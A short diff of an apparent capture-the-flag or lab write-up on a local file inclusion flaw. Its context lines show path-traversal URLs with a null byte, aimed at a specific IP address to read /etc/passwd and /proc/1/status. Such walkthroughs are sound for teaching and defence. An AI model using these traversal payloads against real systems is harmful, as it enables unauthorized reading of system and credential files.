@@ -28,6 +28,7 @@ Here we can see two things:
 - The LFI works
 
 Let's continue by trying to include classic files such as /etc/passwd
+
 `http://52.50.60.154/index.php?p=../../../../../../../../../../../etc/passwd%00` (remember about the null byte so that the .php extension is not added)
 ![](https://i.imgur.com/2cKwXpI.png)
 
@@ -50,6 +51,7 @@ https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html
 
 
 Let's try it.
+
 `http://52.50.60.154/index.php?p=../../../../../../../../../../../proc/1/status%00`
 ![](https://i.imgur.com/Oy2ZvNW.png)
 
